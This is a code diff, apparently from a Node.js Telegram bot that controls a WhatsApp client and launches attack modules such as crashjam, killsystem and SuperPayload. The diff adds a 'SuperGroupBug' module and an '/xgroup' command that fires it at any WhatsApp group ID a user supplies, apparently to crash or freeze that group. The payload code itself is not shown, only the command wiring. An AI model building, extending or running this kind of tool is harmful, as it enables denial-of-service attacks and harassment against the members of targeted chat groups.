@@ -41,6 +41,7 @@ const crashjamLogic = require(SYLoves + 'crashjam');
 const killsystemLogic = require(SYLoves + 'killsystem');
 const gcFrzLogic = require(SYLoves + 'gcFrz');
 const SuperPayload = require(SYLoves + 'SuperPayload');
+const SuperGroupBugLogic = require(SYLoves + 'SuperGroupBug');
 
 const colors = {
     reset: "\x1b[0m", gray: "\x1b[90m", blue: "\x1b[34m", green: "\x1b[32m",
@@ -1162,6 +1163,14 @@ function startSYloveBot(token) {
                 if (!targetJid || !targetJid.endsWith('@g.us')) {
                     return S7.sendMessage(chatId, `❌ Provide a valid group JID.\nExample: /${cmd} 123456@g.us 1`);
                 }
+
+                if (cmd === 'xgroup') {
+                    log('command', msg.from.first_name, `Calling SUPER XGROUP on ${targetJid}`);
+                    await S7.sendPhoto(chatId, LoveLogo, { caption: BvgSYLoVe(targetJid), parse_mode: 'HTML' });
+                    await SuperGroupBugLogic.SuperGroupBug(client, targetJid);
+                    return;
+                }
+
                 if (!durationArg) {
                     return S7.sendMessage(chatId, `❌ Provide duration in hours.\nExample: /${cmd} 123456@g.us 1`);
                 }
